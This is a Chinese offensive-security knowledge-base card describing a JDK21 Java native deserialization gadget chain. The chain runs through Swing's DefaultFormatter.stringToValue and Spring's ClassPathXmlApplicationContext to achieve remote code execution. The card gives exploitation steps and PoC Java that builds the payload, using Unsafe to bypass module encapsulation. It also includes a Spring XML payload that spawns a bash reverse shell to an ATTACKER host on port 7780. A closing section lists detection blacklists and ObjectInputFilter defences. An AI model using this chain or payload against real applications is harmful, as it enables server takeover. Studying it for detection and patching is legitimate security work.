---
id: web-java-deser-jdk-defaultformatter-stringtovalue-swing-chain
title: JDK21 原生反序列化链：JFormattedTextField$FocusLostHandler.run 触发 commitEdit → DefaultFormatter.stringToValue 用任意 String 构造器实例化类，ClassPathXmlApplicationContext 加载远程 XML RCE
type: scenario
domain: web
path: web/java/deserialization/jdk
technique: jdk-defaultformatter-stringtovalue-swing-deser-chain
tags:
- java
- deserialization
- jdk
- swing
- gadget-chain
- classpathxmlapplicationcontext
- hibernate
- module-bypass
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V393
  verified_at: '2026-11-09T11:29:37+08:00'
  notes: 已对照原文与8张图核对：DefaultFormatter.stringToValue 的 getConstructor(String.class).newInstance 与 checkPackageAccess/SwingUtilities2.checkAccess、FocusLostHandler.run→commitEdit 触发、reactor ExecutorTrackedRunnable 模块隔离跳板、Hibernate TypedValue/ComponentType/GetterMethodImpl+HashMap 手工表调用 run，以及图03完整栈与图07计算器、图08 JRMP 投递均一致；与既有 JDK 原生链卡(EventListenerList/XString/SpringAOP TemplatesImpl/Hibernate) sink 与触发点不同，非重复；dedup 全 related/new。原文按 jdk21 章节演示、未给组件受影响版本区间，未设 versions；无 source URL/文章 ID/长段摘录；未复跑 PoC。颗粒度合适。
url: /docs/web/java/deserialization/jdk/web-java-deser-jdk-defaultformatter-stringtovalue-swing-chain/
draft: false
kb_aliases:
- DefaultFormatter stringToValue
- JFormattedTextField FocusLostHandler
- javax.swing 反序列化链
- JDK21 原生链
- 任意 String 构造器实例化
- ClassPathXmlApplicationContext 反序列化
- ExecutorTrackedRunnable 模块隔离
- 模块化绕过 Unsafe
---

## 一句话结论

JDK 自带 Swing 类中存在一条完整原生反序列化链：把 `JFormattedTextField$FocusLostHandler`（持有 `this$0` 指向一个 `DefaultFormatter` 已 `setValueClass(ClassPathXmlApplicationContext.class)` 的 `JFormattedTextField`，文本为攻击者 URL）挂在某个“任意无参方法调用”gadget 上，触发 `FocusLostHandler.run() → commitEdit() → DefaultFormatter.stringToValue()`；`stringToValue` 会用 `valueClass.getConstructor(String.class).newInstance(text)` 实例化任意带 String 构造器的类，于是 `new ClassPathXmlApplicationContext("http://attacker/poc.xml")` 加载远程 Spring XML，经 `ProcessBuilder` bean 执行命令。JDK17+ 的模块强封装可在构造期用 Unsafe 绕过，执行期用一个非 JDK 模块的 `Runnable`（如 reactor-core 的 `ExecutorScheduler$ExecutorTrackedRunnable`）承接 `task.run()`，避免反射调用 JDK 内部类。

## 原理

- **sink：`DefaultFormatter.stringToValue(String)`**：反编译逻辑为 `Class<?> vc = getValueClass(); ... cons = vc.getConstructor(String.class); return cons.newInstance(string);`（前面只有 `ReflectUtil.checkPackageAccess(vc)` 与 `SwingUtilities2.checkAccess(...)`，针对的是 JDK 受限包）。只要 valueClass 是应用 classpath 上的普通类且存在 public `(String)` 构造器，就能用攻击者字符串实例化它——这是一个通用的“任意 String 构造器实例化”原语。
- **为什么 `ClassPathXmlApplicationContext` 能接住**：它的 `(String)` 构造器把参数当作资源位置（支持 URL），构造时即 refresh 上下文并解析 XML，`<bean class="java.lang.ProcessBuilder" init-method="start">` 会实例化并调用 `start()`，从而执行 XML 中 `<list>` 里的命令。
- **触发点：`JFormattedTextField.commitEdit()`**：它调用 `getFormatter().stringToValue(getText())`；而内部类 `JFormattedTextField$FocusLostHandler`（实现 `Runnable, Serializable`，持有外部类引用 `this$0`）的 `run()` 在 `focusLostBehavior` 为 COMMIT/COMMIT_OR_REVERT 时调用 `this$0.commitEdit()`。因此只要有人调用 handler 的 `run()`，整条链就走到 sink。
- **谁来调用 `run()`**：用现成的任意无参方法调用 gadget。本例使用 Hibernate 5 的 `TypedValue.hashCode → ComponentType.getHashCode → AbstractComponentTuplizer.getPropertyValue → GetterMethodImpl.get → Method.invoke` 路径（与利用 ActivatableRef.getRef 的 Hibernate 链同一机制），把 Method 设为 `ExecutorTrackedRunnable.run`，HashMap 反序列化时即触发。
- **模块隔离与 Runnable 跳板**：JDK17+ 下 `javax.swing` 属于 `java.desktop` 模块、内部类不导出，直接用 Unsafe/反射读写 `this$0` 会被强封装拦截；构造 payload 时需先绕过模块访问检查（Unsafe 改 `Class.module` 或 `--add-opens java.desktop/javax.swing=ALL-UNNAMED`）。执行期 `GetterMethodImpl` 反射调用的 Method 若属于 JDK 模块内的非导出类，会遇到访问问题；改用一个非 JDK 模块的公共 `Runnable` 承接——reactor-core 的 `ExecutorScheduler$ExecutorTrackedRunnable`（`run()` 内部直接 `task.run()`）——就能在 unnamed module 内完成调用，`task` 字段指向 `FocusLostHandler`。
- **为什么成立**：整条链只用 JDK 内置 Swing 类 + 任意方法调用 gadget + Spring 的 `ClassPathXmlApplicationContext`；`stringToValue` 的构造器实例化是正常功能，黑名单若不覆盖 `javax.swing.*` 与目标类就拦不住。

## 触发条件

- 目标存在 Java 原生反序列化入口（`ObjectInputStream.readObject` 等），攻击者可控制序列化字节。
- classpath 含 Spring（`ClassPathXmlApplicationContext`）与 Hibernate 5（任意无参方法 gadget）；JDK 含 Swing 模块。
- 目标可访问攻击者提供的 XML（HTTP 或本地路径）。
- JDK17+ 需能绕过模块封装构造 payload，并用非 JDK 模块 Runnable 承接执行；JDK8/11 无模块限制可直接构造。

## 利用步骤

1. 构造 `DefaultFormatter`，`setValueClass(ClassPathXmlApplicationContext.class)`；用 `new JFormattedTextField(formatter)` 创建文本框并 `setValue("http://attacker/poc.xml")`（该值会作为 `getText()` 传给 `stringToValue`）。
2. Unsafe/反射实例化 `javax.swing.JFormattedTextField$FocusLostHandler`，把 `this$0` 字段指向步骤 1 的文本框。
3. 实例化 `reactor.core.scheduler.ExecutorScheduler$ExecutorTrackedRunnable`，把 `task` 字段指向 handler（构造期用 Unsafe 分配实例并写字段，绕过模块检查）。
4. 用 Hibernate 5 gadget 构造方法调用器：`GetterMethodImpl(ExecutorTrackedRunnable.class, "run", Runner.run Method)` 数组塞进 `PojoComponentTuplizer.getters`，`ComponentType.componentTuplizer` 指向它，`TypedValue` 的 value 为 ExecutorTrackedRunnable 实例；把两个 TypedValue 手工放进 size=2 的 `HashMap.table`。
5. 序列化该 HashMap；目标 `readObject` 时 `HashMap.readObject → TypedValue.hashCode → ComponentType.getHashCode → GetterMethodImpl.get → ExecutorTrackedRunnable.run → FocusLostHandler.run → commitEdit → stringToValue → new ClassPathXmlApplicationContext(url)`。
6. 远程 XML 用 ProcessBuilder bean 反弹 shell。
7. 通过 JNDI（LDAP Reference/JRMP listener）或任何反序列化入口把字节交给目标。

## PoC

核心构造（省略 Hibernate 调用器的完整细节，见关联卡）：

```java
DefaultFormatter fmt = new DefaultFormatter();
fmt.setValueClass(ClassPathXmlApplicationContext.class);
JFormattedTextField field = new JFormattedTextField(fmt);
field.setValue("http://127.0.0.1:8001/poc.xml");

Class<?> handlerCls = Class.forName("javax.swing.JFormattedTextField$FocusLostHandler");
Object handler = UnsafeTools.newClass(handlerCls);                 // 绕过模块封装分配实例
UnsafeTools.setObject(handler, handlerCls.getDeclaredField("this$0"), field);

Class<?> runnableCls = Class.forName("reactor.core.scheduler.ExecutorScheduler$ExecutorTrackedRunnable");
Object runner = UnsafeTools.newClass(runnableCls);
UnsafeTools.setObject(runner, runnableCls.getDeclaredField("task"), handler);

Object hibernateMap = makeHibernateNoArgCaller(runner, runnableCls, "run"); // TypedValue/ComponentType/HashMap
byte[] payload = SerialTools.serialize(hibernateMap);              // 交给目标 readObject
```

关键调用栈（调试器实测）：

```text
ClassPathXmlApplicationContext.<init>
DefaultFormatter.stringToValue:262
JFormattedTextField.commitEdit:563
JFormattedTextField$FocusLostHandler.run:681
GetterMethodImpl.get:42
AbstractComponentTuplizer.getPropertyValue:59
ComponentType.getPropertyValue:419
ComponentType.getHashCode:233
TypedValue.hashCode:56
HashMap.hash:338
HashMap.readObject:1561
```

反弹 shell 的最小 Spring XML：

```xml
<beans xmlns="http://www.springframework.org/schema/beans">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg><list>
      <value>/bin/bash</value><value>-c</value>
      <value>bash -i &gt;&amp; /dev/tcp/ATTACKER/7780 &lt;&amp;1</value>
    </list></constructor-arg>
  </bean>
</beans>
```

## 变体与关联

- 关联：Hibernate 5 的 `TypedValue/ComponentType/PojoComponentTuplizer/GetterMethodImpl` 任意无参方法调用机制见 [[web-java-deser-hibernate-activatableref-jrmp-secondary-bypass]]（那张卡用它调 `ActivatableRef.getRef`，本卡用它调 `run()`）。
- 变体：任何 public `(String)` 构造器的类都可作为 `valueClass`；`ClassPathXmlApplicationContext` 只是最直接的 XML→RCE 落点，也可换成其它会加载远程资源/触发副作用的类。
- 变体：JDK8/11 无模块强封装，可省略 Unsafe 绕过步骤直接反射构造；JDK17+ 也可改用 `--add-opens java.desktop/javax.swing=ALL-UNNAMED` 环境。
- 变体：`FocusLostHandler` 是 JDK 内部 `Runnable`，同类可序列化 Runnable 均可替换；模块隔离下优先选非 JDK 模块的包装类做跳板。
- 关联：JDK 原生链触发点总览（EventListenerList、XString、TextAndMnemonicHashMap 等）见 [[web-java-deserialization-jdk-eventlistenerlist-tostring]] 等 JDK 原生链卡片。
- 关联：JNDI 高版本投递反序列化 payload 见 [[web-java-rmi-jrmp-exceptional-return-jndi-jdk21-bypass]]。

## 检测与防御

- 检测：反序列化黑名单需覆盖 `javax.swing.*`、`DefaultFormatter`、`JFormattedTextField$FocusLostHandler`、`ClassPathXmlApplicationContext`、reactor `ExecutorTrackedRunnable` 等类名；监控 `ClassPathXmlApplicationContext` 从 URL 加载 XML 的行为与随后的 `ProcessBuilder.start`。
- 防御：用 `ObjectInputFilter` 做类白名单而不是黑名单；禁止不可信数据进入 `readObject`；禁用远程资源加载/收紧 Spring XML 解析；JDK 模块强封装只提高构造门槛，不是安全边界，核心仍是反序列化入口治理。
